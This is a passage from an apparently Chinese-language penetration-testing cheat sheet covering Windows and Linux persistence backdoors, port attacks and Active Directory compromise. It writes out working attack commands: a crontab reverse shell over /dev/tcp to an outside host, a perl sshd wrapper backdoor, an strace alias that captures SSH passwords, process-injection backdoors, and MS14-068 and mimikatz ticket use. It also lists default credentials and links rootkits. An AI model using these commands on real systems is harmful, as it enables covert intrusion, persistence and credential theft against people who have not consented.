<h5 id="15、Netsh"><a href="#15、Netsh" class="headerlink" title="15、Netsh"></a>15、<a href="https://3gstudent.github.io/3gstudent.github.io/Netsh-persistence/" target="_blank" rel="noopener">Netsh</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper c:\test\netshtest.dll</span><br></pre></td></tr></table></figure>
<p>后门触发：每次调用netsh</p>
<blockquote>
<p>dll编写:<a href="https://github.com/outflanknl/NetshHelperBeacon" target="_blank" rel="noopener">https://github.com/outflanknl/NetshHelperBeacon</a></p>
</blockquote>
<h5 id="16、Shim"><a href="#16、Shim" class="headerlink" title="16、Shim"></a>16、<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/" target="_blank" rel="noopener">Shim</a></h5><p>常用方式：<br>InjectDll<br>RedirectShortcut<br>RedirectEXE</p>
<h5 id="17、DLL劫持"><a href="#17、DLL劫持" class="headerlink" title="17、DLL劫持"></a>17、<a href="https://3gstudent.github.io/3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">DLL劫持</a></h5><p>通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程<br>使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行<br>工具：<a href="https://github.com/sensepost/rattler" target="_blank" rel="noopener">https://github.com/sensepost/rattler</a><br>工具：<a href="https://github.com/Yonsm/AheadLib" target="_blank" rel="noopener">https://github.com/Yonsm/AheadLib</a></p>
<h5 id="18、DoubleAgent"><a href="#18、DoubleAgent" class="headerlink" title="18、DoubleAgent "></a>18、<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)/" target="_blank" rel="noopener">DoubleAgent </a></h5><p>编写自定义Verifier provider DLL<br>通过Application Verifier进行安装<br>注入到目标进程执行payload<br>每当目标进程启动，均会执行payload，相当于一个自启动的方式<br>POC : <a href="https://github.com/Cybellum/DoubleAgent" target="_blank" rel="noopener">https://github.com/Cybellum/DoubleAgent</a></p>
<h5 id="19、waitfor-exe"><a href="#19、waitfor-exe" class="headerlink" title="19、waitfor.exe "></a>19、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/" target="_blank" rel="noopener">waitfor.exe </a></h5><p>不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe<br>POC : <a href="https://github.com/3gstudent/Waitfor-Persistence" target="_blank" rel="noopener">https://github.com/3gstudent/Waitfor-Persistence</a></p>
<h5 id="20、AppDomainManager"><a href="#20、AppDomainManager" class="headerlink" title="20、AppDomainManager"></a>20、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/" target="_blank" rel="noopener">AppDomainManager</a></h5><p>针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p>
<h5 id="21、Office"><a href="#21、Office" class="headerlink" title="21、Office"></a>21、Office</h5><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/" target="_blank" rel="noopener">劫持Office软件的特定功能</a>:通过dll劫持,在Office软件执行特定功能时触发后门<br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8/" target="_blank" rel="noopener">利用VSTO实现的office后门</a><br><a href="https://github.com/3gstudent/Office-Persistence" target="_blank" rel="noopener">Office加载项</a></p>
<ul>
<li>Word WLL </li>
<li>Excel XLL </li>
<li>Excel VBA add-ins </li>
<li>PowerPoint VBA add-ins</li>
</ul>
<blockquote>
<p>参考1 ：<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/</a><br>参考2 ：<a href="https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/</a></p>
</blockquote>
<h5 id="22、CLR"><a href="#22、CLR" class="headerlink" title="22、CLR"></a>22、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/" target="_blank" rel="noopener">CLR</a></h5><p>无需管理员权限的后门，并能够劫持所有.Net程序<br>POC:<a href="https://github.com/3gstudent/CLR-Injection" target="_blank" rel="noopener">https://github.com/3gstudent/CLR-Injection</a></p>
<h5 id="23、msdtc"><a href="#23、msdtc" class="headerlink" title="23、msdtc"></a>23、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/" target="_blank" rel="noopener">msdtc</a></h5><p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测<br>利用：向 %windir%\system32\目录添加dll并重命名为oci.dll</p>
<h5 id="24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="24、Hijack CAccPropServicesClass and MMDeviceEnumerato"></a>24、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/" target="_blank" rel="noopener">Hijack CAccPropServicesClass and MMDeviceEnumerato</a></h5><p>利用COM组件，不需要重启系统，不需要管理员权限<br>通过修改注册表实现<br>POC：<a href="https://github.com/3gstudent/COM-Object-hijacking" target="_blank" rel="noopener">https://github.com/3gstudent/COM-Object-hijacking</a> </p>
<h5 id="25、Hijack-explorer-exe"><a href="#25、Hijack-explorer-exe" class="headerlink" title="25、Hijack explorer.exe"></a>25、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/" target="_blank" rel="noopener">Hijack explorer.exe</a></h5><p>COM组件劫持，不需要重启系统，不需要管理员权限<br>通过修改注册表实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</span><br><span class="line">HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span><br></pre></td></tr></table></figure>
<h5 id="26、Windows-FAX-DLL-Injection"><a href="#26、Windows-FAX-DLL-Injection" class="headerlink" title="26、Windows FAX DLL Injection"></a>26、Windows FAX DLL Injection</h5><p>通过DLL劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载<br>Explorer.exe在启动时会加载<code>c:\Windows\System32\fxsst.dll</code>(服务默认开启，用于传真服务)将payload.dll保存在<code>c:\Windows\fxsst.dll</code>，能够实现dll劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载</p>
<h5 id="27、特殊注册表键值"><a href="#27、特殊注册表键值" class="headerlink" title="27、特殊注册表键值"></a>27、特殊注册表键值</h5><p>在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。<br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/" target="_blank" rel="noopener">《渗透技巧——“隐藏”注册表的创建》</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">《渗透技巧——“隐藏”注册表的更多测试》</a></p>
<h5 id="28、快捷方式后门"><a href="#28、快捷方式后门" class="headerlink" title="28、快捷方式后门"></a>28、快捷方式后门</h5><p>替换我的电脑快捷方式启动参数<br>POC : <a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1" target="_blank" rel="noopener">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p>
<h5 id="29、Logon-Scripts"><a href="#29、Logon-Scripts" class="headerlink" title="29、Logon Scripts"></a>29、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/" target="_blank" rel="noopener">Logon Scripts</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure>
<h5 id="30、Password-Filter-DLL"><a href="#30、Password-Filter-DLL" class="headerlink" title="30、Password Filter DLL"></a>30、<a href="https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank" rel="noopener">Password Filter DLL</a></h5><h5 id="31、利用BHO实现IE浏览器劫持"><a href="#31、利用BHO实现IE浏览器劫持" class="headerlink" title="31、利用BHO实现IE浏览器劫持"></a>31、<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/" target="_blank" rel="noopener">利用BHO实现IE浏览器劫持</a></h5><h4 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h4><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h5><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;dns.wuyun.org&#x2F;53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
<h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a>硬链接sshd</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;2333;</span><br></pre></td></tr></table></figure>
<p>链接：ssh <a href="mailto:root@192.168.206.142">root@192.168.206.142</a> -p 2333</p>
<h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">cd &#x2F;usr&#x2F;sbin</span><br><span class="line">mv sshd ..&#x2F;bin</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;&#x2F;不用重启也行</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure>
<h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read,write,connect -s2048 ssh&#39;</span><br></pre></td></tr></table></figure>
<p>source .bashrc</p>
<h5 id="Cymothoa-进程注入backdoor"><a href="#Cymothoa-进程注入backdoor" class="headerlink" title="Cymothoa_进程注入backdoor"></a>Cymothoa_进程注入backdoor</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;cymothoa -p 2270 -s 1 -y 7777</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv ip 7777</span><br></pre></td></tr></table></figure>
<h5 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h5><p><a href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz" target="_blank" rel="noopener">openssh_rootkit</a><br><a href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz" target="_blank" rel="noopener">Kbeast_rootkit </a><br>Mafix + Suterusu rootkit</p>
<h5 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h5><p><a href="https://github.com/Screetsec/Vegile" target="_blank" rel="noopener">Vegile </a><br><a href="https://github.com/icco/backdoor" target="_blank" rel="noopener">backdoor </a></p>
<h3 id="WEB后门"><a href="#WEB后门" class="headerlink" title="WEB后门"></a>WEB后门</h3><p>PHP Meterpreter后门<br>Aspx Meterpreter后门<br>weevely<br>webacoo<br>….</p>
<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h3><h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><ul>
<li>1.端口的指纹信息（版本信息） </li>
<li>2.端口所对应运行的服务  </li>
<li>3.常见的默认端口号  </li>
<li>4.尝试弱口令 </li>
</ul>
<h4 id="端口爆破"><a href="#端口爆破" class="headerlink" title="端口爆破"></a>端口爆破</h4><p><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">hydra </a></p>
<h4 id="端口弱口令"><a href="#端口弱口令" class="headerlink" title="端口弱口令"></a>端口弱口令</h4><ul>
<li>NTScan  </li>
<li>Hscan  </li>
<li>自写脚本 </li>
</ul>
<h4 id="端口溢出"><a href="#端口溢出" class="headerlink" title="端口溢出"></a>端口溢出</h4><p><strong>smb</strong></p>
<ul>
<li>ms08067 </li>
<li>ms17010 </li>
<li>ms11058 </li>
<li>… </li>
</ul>
<p><strong>apache</strong><br><strong>ftp</strong><br><strong>…</strong></p>
<h4 id="常见的默认端口"><a href="#常见的默认端口" class="headerlink" title="常见的默认端口"></a>常见的默认端口</h4><h5 id="1、web类-web漏洞-敏感目录"><a href="#1、web类-web漏洞-敏感目录" class="headerlink" title="1、web类(web漏洞/敏感目录)"></a>1、web类(web漏洞/敏感目录)</h5><p>第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix …</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">8000-9090 web</span><br></pre></td></tr></table></figure>
<h5 id="2、数据库类-扫描弱口令"><a href="#2、数据库类-扫描弱口令" class="headerlink" title="2、数据库类(扫描弱口令)"></a>2、数据库类(扫描弱口令)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle </span><br><span class="line">3306 MySQL </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">50000 DB2</span><br></pre></td></tr></table></figure>
<h5 id="3、特殊服务类-未授权-命令执行类-漏洞"><a href="#3、特殊服务类-未授权-命令执行类-漏洞" class="headerlink" title="3、特殊服务类(未授权/命令执行类/漏洞)"></a>3、特殊服务类(未授权/命令执行类/漏洞)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">443 SSL心脏滴血 </span><br><span class="line">445 ms08067&#x2F;ms11058&#x2F;ms17010等 </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
<h5 id="4、常用端口类-扫描弱口令-端口爆破"><a href="#4、常用端口类-扫描弱口令-端口爆破" class="headerlink" title="4、常用端口类(扫描弱口令/端口爆破)"></a>4、常用端口类(扫描弱口令/端口爆破)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">445 SMB弱口令扫描 </span><br><span class="line">2601,2604 zebra路由，默认密码zebra </span><br><span class="line">3389 远程桌面</span><br></pre></td></tr></table></figure>
<h5 id="5、端口合计所对应的服务"><a href="#5、端口合计所对应的服务" class="headerlink" title="5、端口合计所对应的服务"></a>5、端口合计所对应的服务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">25 SMTP </span><br><span class="line">53 DNS </span><br><span class="line">69 TFTP </span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">110 POP3 </span><br><span class="line">135 RPC </span><br><span class="line">139 NETBIOS </span><br><span class="line">143 IMAP </span><br><span class="line">161 SNMP </span><br><span class="line">389 LDAP </span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试 </span><br><span class="line">445 SMB </span><br><span class="line">512,513,514 Rexec </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">1025,111 NFS </span><br><span class="line">1080 socks </span><br><span class="line">1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 </span><br><span class="line">1433 MSSQL (暴力破解) </span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line">2082&#x2F;2083 cpanel主机管理系统登陆 （国外用较多） </span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line">2601,2604 zebra路由，默认密码zebra </span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line">3306 MySQL （暴力破解） </span><br><span class="line">3312&#x2F;3311 kangle主机管理系统登陆 </span><br><span class="line">3389 远程桌面 </span><br><span class="line">3690 svn </span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line">4848 GlassFish web中间件 弱口令:admin&#x2F;adminadmin </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">5900 vnc </span><br><span class="line">5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; </span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line">8080 tomcat&#x2F;WDCd&#x2F; 主机管理系统，默认弱口令 </span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line">8081 Symantec AV&#x2F;Filter for MSE </span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line">8649 ganglia </span><br><span class="line">8888 amh&#x2F;LuManager 主机管理系统默认端口 </span><br><span class="line">9000 fcgi fcig php执行 </span><br><span class="line">9043 websphere[web中间件] 弱口令: admin&#x2F;admin websphere&#x2F; websphere ststem&#x2F;manager </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">10000 Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50060 hadoop </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
<h3 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h3><h4 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>powerview.ps1 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Get-NetDomain - gets the name of the current user&#39;s domain</span><br><span class="line">Get-NetForest - gets the forest associated with the current user&#39;s domain</span><br><span class="line">Get-NetForestDomains - gets all domains for the current forest</span><br><span class="line">Get-NetDomainControllers - gets the domain controllers for the current computer&#39;s domain</span><br><span class="line">Get-NetCurrentUser - gets the current [domain\]username</span><br><span class="line">Get-NetUser - returns all user objects, or the user specified (wildcard specifiable)</span><br><span class="line">Get-NetUserSPNs - gets all user ServicePrincipalNames</span><br><span class="line">Get-NetOUs - gets data for domain organization units</span><br><span class="line">Get-NetGUIDOUs - finds domain OUs linked to a specific GUID</span><br><span class="line">Invoke-NetUserAdd - adds a local or domain user</span><br><span class="line">Get-NetGroups - gets a list of all current groups in the domain</span><br><span class="line">Get-NetGroup - gets data for each user in a specified domain group</span><br><span class="line">Get-NetLocalGroups - gets a list of localgroups on a remote host or hosts</span><br><span class="line">Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts</span><br><span class="line">Get-NetLocalServices - gets a list of running services&#x2F;paths on a remote host or hosts</span><br><span class="line">Invoke-NetGroupUserAdd - adds a user to a specified local or domain group</span><br><span class="line">Get-NetComputers - gets a list of all current servers in the domain</span><br><span class="line">Get-NetFileServers - get a list of file servers used by current domain users</span><br><span class="line">Get-NetShare - gets share information for a specified server</span><br><span class="line">Get-NetLoggedon - gets users actively logged onto a specified server</span><br><span class="line">Get-NetSessions - gets active sessions on a specified server</span><br><span class="line">Get-NetFileSessions - returned combined Get-NetSessions and Get-NetFiles</span><br><span class="line">Get-NetConnections - gets active connections to a specific server resource (share)</span><br><span class="line">Get-NetFiles - gets open files on a server</span><br><span class="line">Get-NetProcesses - gets the remote processes and owners on a remote server</span><br></pre></td></tr></table></figure>
<p>BloodHound<br>​            </p>
<h4 id="获取域控的方法"><a href="#获取域控的方法" class="headerlink" title="获取域控的方法"></a>获取域控的方法</h4><h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。<br>相关阅读: </p>
<ul>
<li><a href="http://www.freebuf.com/vuls/92016.html" target="_blank" rel="noopener">寻找SYSVOL里的密码和攻击GPP（组策略偏好） </a></li>
<li><a href="http://blog.51cto.com/ycrsjxy/203095" target="_blank" rel="noopener">Windows Server 2008 R2之四管理Sysvol文件夹 </a></li>
<li><a href="https://adsecurity.org/?p=2288" target="_blank" rel="noopener">SYSVOL中查找密码并利用组策略首选项 </a></li>
<li><a href="https://xz.aliyun.com/t/1653" target="_blank" rel="noopener">利用SYSVOL还原组策略中保存的密码</a> </li>
</ul>
<h5 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</span><br></pre></td></tr></table></figure>
<p>利用mimikatz将工具得到的<a href="mailto:TGT_domainuser@SERVER.COM.ccache">TGT_domainuser@SERVER.COM.ccache</a>写入内存，创建缓存证书：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit</span><br><span class="line">net use k: \pentest.comc$</span><br></pre></td></tr></table></figure>
<p>相关阅读 :</p>
<ul>
<li><a href="http://adsecurity.org/?p=676" target="_blank" rel="noopener">Kerberos的工具包PyKEK</a> </li>
<li><a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">深入解读MS14-068漏洞</a> </li>
<li><a href="https://adsecurity.org/?p=541" target="_blank" rel="noopener">Kerberos的安全漏洞</a> </li>
</ul>
